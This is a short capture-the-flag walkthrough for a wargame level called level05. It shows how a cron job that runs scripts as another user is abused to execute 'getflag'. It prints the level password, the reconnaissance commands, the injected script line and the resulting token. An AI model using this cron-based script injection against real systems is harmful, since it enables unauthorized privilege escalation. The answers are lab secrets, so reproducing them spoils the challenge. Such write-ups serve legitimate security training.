## Step 1: Login
`su level05`

**password:** ne2searoevaevoem4ov4ar8ap

## Step 2: Find flag

`cd ../../..`

`find . -user flag05`
> ./usr/sbin/openarenaserver

`cat /var/mail/level05`
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

`echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag.sh`

`cat /tmp/flag`
> Check flag.Here is your token : viuaaale9huek52boumoomioc
